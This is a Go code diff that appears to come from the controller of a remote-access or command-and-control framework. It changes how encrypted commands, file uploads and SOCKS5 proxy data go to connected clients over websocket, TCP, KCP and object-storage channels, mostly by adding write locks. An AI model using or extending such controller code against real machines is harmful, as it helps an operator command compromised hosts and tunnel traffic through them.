@@ -10,7 +10,6 @@ import (
 	"BackendTemplate/pkg/database"
 	"BackendTemplate/pkg/encrypt"
 	"BackendTemplate/pkg/utils"
-	"bufio"
 	"encoding/binary"
 	"fmt"
 	"github.com/gorilla/websocket"
@@ -124,15 +123,11 @@ func SendCommand(uid string, command string) {
 		cmdTypeBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.FileContent))
 		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
-	} else if strings.HasPrefix(command, "socks5 ") {
-		cmd := strings.TrimPrefix(command, "socks5 ")
+	} else if strings.HasPrefix(command, "socks5data ") {
+		cmd := strings.TrimPrefix(command, "socks5data ")
 		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.Socks5Start))
+		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.Socks5Data))
 		byteToSend = append(cmdTypeBytes, []byte(cmd)...)
-	} else if strings.HasPrefix(command, "socks5Close") {
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command1.Socks5Close))
-		byteToSend = cmdTypeBytes
 	} else if strings.HasPrefix(command, "clear") {
 		var shell database.Shell
 		database.Engine.Where("uid = ?", uid).Get(&shell)
@@ -147,7 +142,11 @@ func SendCommand(uid string, command string) {
 		cmdBytes, _ := encrypt.Encrypt(byteToSend)
 		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
-		ws.ClientManager[uid].WriteMessage(websocket.BinaryMessage, cmdBase64)
+		client := ws.ClientManager[uid]
+		client.WriteMu.Lock()
+		client.Conn.WriteMessage(websocket.BinaryMessage, cmdBase64)
+		client.WriteMu.Unlock()
+		//ws.ClientManager[uid].WriteMessage(websocket.BinaryMessage, cmdBase64)
 	case "tcp":
 		cmdBytes, _ := encrypt.Encrypt(byteToSend)
 		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
@@ -155,9 +154,13 @@ func SendCommand(uid string, command string) {
 		cmdLen := len(cmdBase64)
 		cmdLenBytes := utils.WriteInt(cmdLen)
 		msgToSend := utils.BytesCombine(cmdLenBytes, cmdBase64)
-		writer := bufio.NewWriter(tcp.TCPClientManger[uid])
-		writer.Write(msgToSend)
-		writer.Flush()
+		client := tcp.TCPClientManger[uid]
+		client.WriteMu.Lock()
+		client.Conn.Write(msgToSend)
+		client.WriteMu.Unlock()
+		//writer := bufio.NewWriter(tcp.TCPClientManger[uid])
+		//writer.Write(msgToSend)
+		//writer.Flush()
 	case "kcp":
 		cmdBytes, _ := encrypt.Encrypt(byteToSend)
 		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
@@ -165,10 +168,10 @@ func SendCommand(uid string, command string) {
 		cmdLen := len(cmdBase64)
 		cmdLenBytes := utils.WriteInt(cmdLen)
 		msgToSend := utils.BytesCombine(cmdLenBytes, cmdBase64)
-		kcp.KCPClientManger[uid].Write(msgToSend)
-	//writer := bufio.NewWriter(kcp.KCPClientManger[uid])
-	//writer.Write(msgToSend)
-	//writer.Flush()
+		client := kcp.KCPClientManger[uid]
+		client.WriteMu.Lock()
+		client.Session.Write(msgToSend)
+		client.WriteMu.Unlock()
 	case "oss":
 		cmdBytes, _ := encrypt.Encrypt(byteToSend)
 		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
@@ -185,7 +188,10 @@ func SendFileUploadCommand(uid string, byteToSend []byte) {
 		cmdBytes, _ := encrypt.Encrypt(byteToSend)
 		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
-		ws.ClientManager[uid].WriteMessage(websocket.BinaryMessage, cmdBase64)
+		client := ws.ClientManager[uid]
+		client.WriteMu.Lock()
+		client.Conn.WriteMessage(websocket.BinaryMessage, cmdBase64)
+		client.WriteMu.Unlock()
 	case "tcp":
 		cmdBytes, _ := encrypt.Encrypt(byteToSend)
 		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
@@ -193,9 +199,13 @@ func SendFileUploadCommand(uid string, byteToSend []byte) {
 		cmdLen := len(cmdBase64)
 		cmdLenBytes := utils.WriteInt(cmdLen)
 		msgToSend := utils.BytesCombine(cmdLenBytes, cmdBase64)
-		writer := bufio.NewWriter(tcp.TCPClientManger[uid])
-		writer.Write(msgToSend)
-		writer.Flush()
+		client := tcp.TCPClientManger[uid]
+		client.WriteMu.Lock()
+		client.Conn.Write(msgToSend)
+		client.WriteMu.Unlock()
+		//writer := bufio.NewWriter(tcp.TCPClientManger[uid])
+		//writer.Write(msgToSend)
+		//writer.Flush()
 	case "kcp":
 		cmdBytes, _ := encrypt.Encrypt(byteToSend)
 		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
@@ -203,10 +213,10 @@ func SendFileUploadCommand(uid string, byteToSend []byte) {
 		cmdLen := len(cmdBase64)
 		cmdLenBytes := utils.WriteInt(cmdLen)
 		msgToSend := utils.BytesCombine(cmdLenBytes, cmdBase64)
-		kcp.KCPClientManger[uid].Write(msgToSend)
-	//writer := bufio.NewWriter(kcp.KCPClientManger[uid])
-	//writer.Write(msgToSend)
-	//writer.Flush()
+		client := kcp.KCPClientManger[uid]
+		client.WriteMu.Lock()
+		client.Session.Write(msgToSend)
+		client.WriteMu.Unlock()
 	case "oss":
 		cmdBytes, _ := encrypt.Encrypt(byteToSend)
 		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
